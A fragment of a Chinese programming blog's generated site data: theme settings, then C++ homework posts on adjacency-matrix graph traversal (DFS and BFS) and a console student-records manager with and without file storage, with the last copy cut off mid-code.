GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1163,"excerpt":"<h1 id=\"图的邻接矩阵遍历\"><a href=\"#图的邻接矩阵遍历\" class=\"headerlink\" title=\"图的邻接矩阵遍历\"></a>图的邻接矩阵遍历</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> m[<span class=\"number\">100</span>][<span class=\"number\">100</span>],vis[<span class=\"number\">100</span>],N;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DFS_1</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(vis[n])<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot; -&gt; &quot;</span>&lt;&lt;n;</span><br><span class=\"line\">\t\tvis[n]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;N;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(m[n][i]&amp;&amp;!vis[i])DFS_1(i);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DFS_2</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">stack</span>&lt;<span class=\"keyword\">int</span>&gt;S;</span><br><span class=\"line\">\tvis[n]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\tS.push(n);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(!S.empty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> t=S.top();</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot; -&gt; &quot;</span>&lt;&lt;t;</span><br><span class=\"line\">\t\tS.pop();</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=N<span class=\"number\">-1</span>;i&gt;=<span class=\"number\">0</span>;i--)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(m[t][i]&amp;&amp;!vis[i])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tS.push(i);</span><br><span class=\"line\">\t\t\t\tvis[i]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BFS</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">queue</span>&lt;<span class=\"keyword\">int</span>&gt;Q;</span><br><span class=\"line\">\tQ.push(n);</span><br><span class=\"line\">\tvis[n]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(!Q.empty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> t=Q.front();</span><br><span class=\"line\">\t\tQ.pop();</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot; -&gt; &quot;</span>&lt;&lt;t;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;N;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(m[t][i]&amp;&amp;!vis[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tQ.push(i);</span><br><span class=\"line\">\t\t\tvis[i]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b,ch;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;N;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class=\"line\">\t\tm[a][b]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tm[b][a]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;ch)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(vis,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(vis));</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(ch==<span class=\"number\">1</span>)DFS_1(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(ch==<span class=\"number\">2</span>)DFS_2(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(ch==<span class=\"number\">3</span>)BFS(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"学生信息管理系统","date":"2020-04-08T08:08:24.000Z","abbrlink":"36af3259","_content":"> C++课程作业\n\n<!--more-->\n**非文件操作:**\n```cpp\n#include <iostream>\n#include <cstring>\n#include <iomanip>\n#include <algorithm>\ntypedef long long ll;\nusing namespace std;\nint K=0;\nclass STU\n{\nprivate:\n    ll Num;\n    char Name[10];\n    char Sex;\n    double Score;\n    bool flag;\npublic:\n    void TITLE_STU();\n    void ADD_STU();\n    void CHANGE_STU();\n    void DEL_STU();\n    void SHOW_STU();\n    void SORT_STU();\n    void MAX_STU();\n    friend bool CMP(STU,STU);\n    STU()\n    {\n        flag=0;\n    }\n    ~STU(){}\n}Boy[1000];\nbool CMP(STU a,STU b)\n{\n    if (a.Score == b.Score)\n\t\treturn a.Num<b.Num;\n\treturn a.Score>b.Score;\n}\nvoid STU::TITLE_STU()\n{\n    cout<<\"\\t1:\\tADD A STUDENT\"<<endl;\n    cout<<\"\\t2:\\tCHANGE STUDENTS\\'S INFORMATION\"<<endl;\n    cout<<\"\\t3:\\tDELETE A STUDENT\"<<endl;\n    cout<<\"\\t4:\\tSHOW STUDENTS INFORMATION\"<<endl;\n    cout<<\"\\t5:\\tSORT BY SCORE\"<<endl;\n    cout<<\"\\t6:\\tSHOW THE MAX SCORE\\' STUDENT\"<<endl;\n    cout<<\"\\t0:\\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM\"<<endl;\n    cout<<endl<<\"\\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS\"<<endl;\n}\nvoid STU::ADD_STU()\n{\n    cout<<\"请输入要添加的学生人数\"<<endl;\n    int T;cin>>T;\n    cout<<\"请输入\"<<T<<\"行学生的学号,姓名,性别,成绩\"<<endl;\n    for(int i=0;i<T;i++,K++)\n    {\n        cin>>Boy[K].Num>>Boy[K].Name>>Boy[K].Sex>>Boy[K].Score;\n        Boy[K].flag=0;\n    }\n    cout<<endl<<\"学生信息导入成功\"<<endl;\n}\nvoid STU::CHANGE_STU()\n{\n    cout<<\"请输入要修改的学生学号,输入0停止删除\"<<endl;\n    ll num;\n    while(cin>>num)\n    {\n        int flag=0;\n        for(int i=0;i<K;i++)\n        {\n            if(num==Boy[i].Num)\n            {\n                cout<<\"请再次输入学生的学号,姓名,性别,成绩\"<<endl;\n                cin>>Boy[i].Num>>Boy[i].Name>>Boy[i].Sex>>Boy[i].Score;\n                Boy[i].flag=0;\n                flag=1;\n                cout<<\"学生信息修改成功\"<<endl;\n            }\n        }\n        if(num==0)break;\n        if(flag==0)cout<<\"NO SUCH STUDENTS\"<<endl;\n    }\n}\nvoid STU::DEL_STU()\n{\n    cout<<\"请输入要删除的学生学号,输入0停止删除\"<<endl;\n    ll num;\n    while(cin>>num)\n    {\n        int flag=0;\n        for(int i=0;i<K;i++)\n        {\n            if(num==Boy[i].Num)\n            {\n                Boy[i].flag=1;\n                flag=1;\n                cout<<\"DELETE SUCCESS!\"<<endl;\n                break;\n            }\n        }\n        if(num==0)break;\n        if(flag==0)cout<<\"NO SUCH STUDENTS\"<<endl;\n    }\n}\nvoid STU::SHOW_STU()\n{\n    cout<<endl<<\"\\tThe Lists Of Students Are Here\"<<endl;\n    cout<<\"-----------------------------------------------\"<<endl;\n    cout<<\"    学号\\t姓名\\t\\t性别\\t成绩\"<<endl;\n    cout<<\"-----------------------------------------------\"<<endl;\n    cout.setf(std::ios::left);\n    for(int i=0;i<K;i++)\n    {\n        if(Boy[i].flag==0)\n        {\n            cout<<Boy[i].Num<<'\\t';\n            cout<<setw(8)<<Boy[i].Name;\n            cout<<\"\\t \"<<Boy[i].Sex<<'\\t';\n            cout<<setiosflags(ios::fixed)<<setprecision(2)<<Boy[i].Score<<endl;\n        }\n    }\n    cout<<\"-----------------------------------------------\"<<endl;\n}\nvoid STU::SORT_STU()\n{\n    sort(Boy,Boy+K,CMP);\n    cout<<\"学生信息排序成功\"<<endl;\n}\nvoid STU::MAX_STU()\n{\n    int Maxn=0,Flag=0;\n    for(int i=0;i<K;i++)\n    {\n        if(Boy[i].Score>=Boy[Maxn].Score)\n        {\n            Maxn=i;\n            Flag=1;\n        }\n    }\n    if(Flag==0)cout<<\"NO STUDENT\"<<endl;\n    else\n    {\n        cout<<\"-----------------------------------------------\"<<endl;\n        cout<<\"    学号\\t姓名\\t\\t性别\\t成绩\"<<endl;\n        cout<<\"-----------------------------------------------\"<<endl;\n        cout.setf(std::ios::left);\n        cout<<Boy[Maxn].Num<<'\\t';\n        cout<<setw(8)<<Boy[Maxn].Name;\n        cout<<\"\\t \"<<Boy[Maxn].Sex<<'\\t';\n        cout<<setiosflags(ios::fixed)<<setprecision(2)<<Boy[Maxn].Score<<endl;\n        cout<<\"-----------------------------------------------\"<<endl;\n    }\n}\nint main()\n{\n    STU S;\n    S.TITLE_STU();\n    int choice;\n    while(cin>>choice)\n    {\n        if(choice==1)S.ADD_STU();\n        else if(choice==2)S.CHANGE_STU();\n        else if(choice==3)S.DEL_STU();\n        else if(choice==4)S.SHOW_STU();\n        else if(choice==5)S.SORT_STU();\n        else if(choice==6)S.MAX_STU();\n        else if(choice==0)break;\n        system(\"PAUSE&CLS\");\n        S.TITLE_STU();\n    }\n    return 0;\n}\n```\n\n**文件操作:**\n```cpp\n#include <iostream>\n#include <cstdio>\n#include <cstring>\n#include <iomanip>\n#include <algorithm>\ntypedef long long ll;\nusing namespace std;\nint K = 0;\nclass STU\n{\nprivate:\n\tll Num;\n\tchar Name[10];\n\tchar Sex;\n\tdouble Score;\n\tbool flag;\npublic:\n\tvoid READ_STU();\n\tvoid WRITE_STU();\n\tvoid TITLE_STU();\n\tvoid ADD_STU();\n\tvoid CHANGE_STU();\n\tvoid DEL_STU();\n\tvoid SHOW_STU();\n\tvoid SORT_STU();\n\tvoid MAX_STU();\n\tfriend bool CMP1(STU, STU);\n\tfriend bool CMP2(STU, STU);\n\tfriend bool CMP3(STU, STU);\n\tSTU()\n\t{\n\t\tflag = 0;\n\t}\n\t~STU() {}\n}Boy[1000];\nvoid STU::READ_STU()\n{\n\tFILE *fp = fopen(\"STU.dat\", \"r\");\n\twhile (fscanf(fp, \"%lld %s %c %lf\", &Boy[K].Num, &Boy[K].Name, &Boy[K].Sex, &Boy[K].Score) != EOF)\n\t{\n\t\tBoy[K].flag = 0;\n\t\tK++;\n\t}\n\tfclose(fp);\n}\nvoid STU::WRITE_STU()\n{\n\tFILE *fp = fopen(\"STU.dat\", \"w\");\n\tfor (int i = 0; i < K; i++)\n\t{\n\t\tif(Boy[i].flag==0)\n\t\tfprintf(fp, \"%lld %s %c %lf\\n\", Boy[i].Num, Boy[i].Name, Boy[i].Sex, Boy[i].Score);\n\t}\n\tfclose(fp);\n}\nbool CMP1(STU a, STU b)\n{\n\treturn a.Num<b.Num;\n}\nbool CMP2(STU a, STU b)\n{\n\tif (strcmp(a.Name,b.Name)==0)\n\t\treturn a.Num<b.Num;\n\treturn strcmp(a.Name,b.Name)<0;\n}\nbool CMP3(STU a, STU b)\n{\n\tif (a.Score == b.Score)\n\t\treturn a.Num<b.Num;\n\treturn a.Score>b.Score;\n}\nvoid STU::TITLE_STU()\n{\n\tcout << \"\\t1:\\tADD A STUDENT\" << endl;\n\tcout << \"\\t2:\\tCHANGE STUDENTS\\'S INFORMATION\" << endl;\n\tcout << \"\\t3:\\tDELETE A STUDENT\" << endl;\n\tcout << \"\\t4:\\tSHOW STUDENTS INFORMATION\" << endl;\n\tcout << \"\\t5:\\tSORT THE STUDENTS\" << endl;\n\tcout << \"\\t6:\\tSHOW THE MAX SCORE\\' STUDENT\" << endl;\n\tcout << \"\\t0:\\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM\" << endl;\n\tcout << endl << \"\\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS\" << endl;\n}\nvoid STU::ADD_STU()\n{\n\tcout << \"请输入要添加的学生人数\" << endl;\n\tint T; cin >> T;\n\tcout << \"请输入\" << T << \"行学生的学号,姓名,性别,成绩\" << endl;\n\tfor (int i = 0; i<T; i++, K++)\n\t{\n\t\tcin >> Boy[K].Num >> Boy[K].Name >> Boy[K].Sex >> Boy[K].Score;\n\t\tBoy[K].flag = 0;\n\t}\n\tcout << endl << \"学生信息导入成功\" << endl;\n}\nvoid STU::CHANGE_STU()\n{\n\tcout << \"请输入要修改的学生学号,输入0停止删除\" << endl;\n\tll num;\n\twhile (cin >> num)\n\t{\n\t\tint flag = 0;\n\t\tfor (int i = 0; i<K; i++)\n\t\t{\n\t\t\tif (num == Boy[i].Num)\n\t\t\t{\n\t\t\t\tcout << \"请再次输入学生的学号,姓名,性别,成绩\" << endl;\n\t\t\t\tcin >> Boy[i].Num >> Boy[i].Name >> Boy[i].Sex >> Boy[i].Score;\n\t\t\t\tBoy[i].flag = 0;\n\t\t\t\tflag = 1;\n\t\t\t\tcout << \"学生信息修改成功\" << endl;\n\t\t\t}\n\t\t}\n\t\tif (num == 0)break;\n\t\tif (flag == 0)cout << \"NO SUCH STUDENTS\" << endl;\n\t}\n}\nvoid STU::DEL_STU()\n{\n\tcout << \"请输入要删除的学生学号,输入0停止删除\" << endl;\n\tll num;\n\twhile (cin >> num)\n\t{\n\t\tint flag = 0;\n\t\tfor (int i = 0; i<K; i++)\n\t\t{\n\t\t\tif (num == Boy[i].Num)\n\t\t\t{\n\t\t\t\tBoy[i].flag = 1;\n\t\t\t\tflag = 1;\n\t\t\t\tcout << \"DELETE SUCCESS!\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (num == 0)break;\n\t\tif (flag == 0)cout << \"NO SUCH STUDENTS\" << endl;\n\t}\n}\nvoid STU::SHOW_STU()\n{\n\tcout << endl << \"\\tThe Lists Of Students Are Here\" << endl;\n\tcout << \"-----------------------------------------------\" << endl;\n\tcout << \"    学号\\t姓名\\t\\t性别\\t成绩\" << endl;\n\tcout << \"-----------------------------------------------\" << endl;\n\tcout.setf(std::ios::left);\n\tfor (int i = 0; i<K; i++)\n\t{\n\t\tif (Boy[i].flag == 0)\n\t\t{\n\t\t\tcout << Boy[i].Num << '\\t';\n\t\t\tcout << setw(8) << Boy[i].Name;\n\t\t\tcout << \"\\t \" << Boy[i].Sex << '\\t';\n\t\t\tcout << setiosflags(ios::fixed) << setprecision(2) << Boy[i].Score << endl;\n\t\t}\n\t}\n\tcout << \"-----------------------------------------------\" << endl;\n}\nvoid STU::SORT_STU()\n{\n\tint x=0;\n\tcout << \"1.按学号排序\" << endl;\n\tcout << \"2.按姓名排序\" << endl;\n\tcout << \"3.按成绩排序\" << endl << endl;;\n\tcout << \"请选择排序规则!\" << endl;\n\tcin >> x;\n\tif(x==1)sort(Boy, Boy + K, CMP1);\n\telse if(x==2)sort(Boy, Boy + K, CMP2);\n\telse if (x == 3)sort(Boy, Boy + K, CMP3);\n\telse cout << \"输入错误，排序失败\" << endl << endl;;\n\tif (x == 1 || x == 2 || x == 3)cout << \"学生信息排序成功\" << endl << endl;\n}\nvoid STU::MAX_STU()\n{\n\tint Maxn = 0, Flag = 0;\n\tfor (int i = 0; i<K; i++)\n\t{\n\t\tif (Boy[i].Score >= Boy[Maxn].Score)\n\t\t{\n\t\t\tMaxn = i;\n\t\t\tFlag = 1;\n\t\t}\n\t}\n\tif (Flag == 0)cout << \"NO STUDENT\" << endl;\n\telse\n\t{\n\t\tcout << \"-----------------------------------------------\" << endl;\n\t\tcout << \"    学号\\t姓名\\t\\t性别\\t成绩\" << endl;\n\t\tcout << \"-----------------------------------------------\" << endl;\n\t\tcout.setf(std::ios::left);\n\t\tcout << Boy[Maxn].Num << '\\t';\n\t\tcout << setw(8) << Boy[Maxn].Name;\n\t\tcout << \"\\t \" << Boy[Maxn].Sex << '\\t';\n\t\tcout << setiosflags(ios::fixed) << setprecision(2) << Boy[Maxn].Score << endl;\n\t\tcout << \"-----------------------------------------------\" << endl;\n\t}\n}\nint main()\n{\n\tSTU S;\n\tS.TITLE_STU();\n\tS.READ_STU();\n\tint choice;\n\twhile (cin >> choice)\n\t{\n\t\tif (choice == 1)S.ADD_STU();\n\t\telse if (choice == 2)S.CHANGE_STU();\n\t\telse if (choice == 3)S.DEL_STU();\n\t\telse if (choice == 4)S.SHOW_STU();\n\t\telse if (choice == 5)S.SORT_STU();\n\t\telse if (choice == 6)S.MAX_STU();\n\t\telse if (choice == 0)\n\t\t{\n\t\t\tS.WRITE_STU();\n\t\t\tbreak;\n\t\t}\n\t\tsystem(\"PAUSE&CLS\");\n\t\tS.TITLE_STU();\n\t}\n\treturn 0;\n}\n```","source":"_posts/学生信息管理系统.md","raw":"---\ntitle: 学生信息管理系统\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - C++\nabbrlink: 36af3259\n---\n> C++课程作业\n\n<!--more-->\n**非文件操作:**\n```cpp\n#include <iostream>\n#include <cstring>\n#include <iomanip>\n#include <algorithm>\ntypedef long long ll;\nusing namespace std;\nint K=0;\nclass STU\n{\nprivate:\n    ll Num;\n    char Name[10];\n    char Sex;\n    double Score;\n    bool flag;\npublic:\n    void TITLE_STU();\n    void ADD_STU();\n    void CHANGE_STU();\n    void DEL_STU();\n    void SHOW_STU();\n    void SORT_STU();\n    void MAX_STU();\n    friend bool CMP(STU,STU);\n    STU()\n    {\n        flag=0;\n    }\n    ~STU(){}\n}Boy[1000];\nbool CMP(STU a,STU b)\n{\n    if (a.Score == b.Score)\n\t\treturn a.Num<b.Num;\n\treturn a.Score>b.Score;\n}\nvoid STU::TITLE_STU()\n{\n    cout<<\"\\t1:\\tADD A STUDENT\"<<endl;\n    cout<<\"\\t2:\\tCHANGE STUDENTS\\'S INFORMATION\"<<endl;\n    cout<<\"\\t3:\\tDELETE A STUDENT\"<<endl;\n    cout<<\"\\t4:\\tSHOW STUDENTS INFORMATION\"<<endl;\n    cout<<\"\\t5:\\tSORT BY SCORE\"<<endl;\n    cout<<\"\\t6:\\tSHOW THE MAX SCORE\\' STUDENT\"<<endl;\n    cout<<\"\\t0:\\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM\"<<endl;\n    cout<<endl<<\"\\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS\"<<endl;\n}\nvoid STU::ADD_STU()\n{\n    cout<<\"请输入要添加的学生人数\"<<endl;\n    int T;cin>>T;\n    cout<<\"请输入\"<<T<<\"行学生的学号,姓名,性别,成绩\"<<endl;\n    for(int i=0;i<T;i++,K++)\n    {\n        cin>>Boy[K].Num>>Boy[K].Name>>Boy[K].Sex>>Boy[K].Score;\n        Boy[K].flag=0;\n    }\n    cout<<endl<<\"学生信息导入成功\"<<endl;\n}\nvoid STU::CHANGE_STU()\n{\n    cout<<\"请输入要修改的学生学号,输入0停止删除\"<<endl;\n    ll num;\n    while(cin>>num)\n    {\n        int flag=0;\n        for(int i=0;i<K;i++)\n        {\n            if(num==Boy[i].Num)\n            {\n                cout<<\"请再次输入学生的学号,姓名,性别,成绩\"<<endl;\n                cin>>Boy[i].Num>>Boy[i].Name>>Boy[i].Sex>>Boy[i].Score;\n                Boy[i].flag=0;\n                flag=1;\n                cout<<\"学生信息修改成功\"<<endl;\n            }\n        }\n        if(num==0)break;\n        if(flag==0)cout<<\"NO SUCH STUDENTS\"<<endl;\n    }\n}\nvoid STU::DEL_STU()\n{\n    cout<<\"请输入要删除的学生学号,输入0停止删除\"<<endl;\n    ll num;\n    while(cin>>num)\n    {\n        int flag=0;\n        for(int i=0;i<K;i++)\n        {\n            if(num==Boy[i].Num)\n            {\n                Boy[i].flag=1;\n                flag=1;\n                cout<<\"DELETE SUCCESS!\"<<endl;\n                break;\n            }\n        }\n        if(num==0)break;\n        if(flag==0)cout<<\"NO SUCH STUDENTS\"<<endl;\n    }\n}\nvoid STU::SHOW_STU()\n{\n    cout<<endl<<\"\\tThe Lists Of Students Are Here\"<<endl;\n    cout<<\"-----------------------------------------------\"<<endl;\n    cout<<\"    学号\\t姓名\\t\\t性别\\t成绩\"<<endl;\n    cout<<\"-----------------------------------------------\"<<endl;\n    cout.setf(std::ios::left);\n    for(int i=0;i<K;i++)\n    {\n        if(Boy[i].flag==0)\n        {\n            cout<<Boy[i].Num<<'\\t';\n            cout<<setw(8)<<Boy[i].Name;\n            cout<<\"\\t \"<<Boy[i].Sex<<'\\t';\n            cout<<setiosflags(ios::fixed)<<setprecision(2)<<Boy[i].Score<<endl;\n        }\n    }\n    cout<<\"-----------------------------------------------\"<<endl;\n}\nvoid STU::SORT_STU()\n{\n    sort(Boy,Boy+K,CMP);\n    cout<<\"学生信息排序成功\"<<endl;\n}\nvoid STU::MAX_STU()\n{\n    int Maxn=0,Flag=0;\n    for(int i=0;i<K;i++)\n    {\n        if(Boy[i].Score>=Boy[Maxn].Score)\n        {\n            Maxn=i;\n            Flag=1;\n        }\n    }\n    if(Flag==0)cout<<\"NO STUDENT\"<<endl;\n    else\n    {\n        cout<<\"-----------------------------------------------\"<<endl;\n        cout<<\"    学号\\t姓名\\t\\t性别\\t成绩\"<<endl;\n        cout<<\"-----------------------------------------------\"<<endl;\n        cout.setf(std::ios::left);\n        cout<<Boy[Maxn].Num<<'\\t';\n        cout<<setw(8)<<Boy[Maxn].Name;\n        cout<<\"\\t \"<<Boy[Maxn].Sex<<'\\t';\n        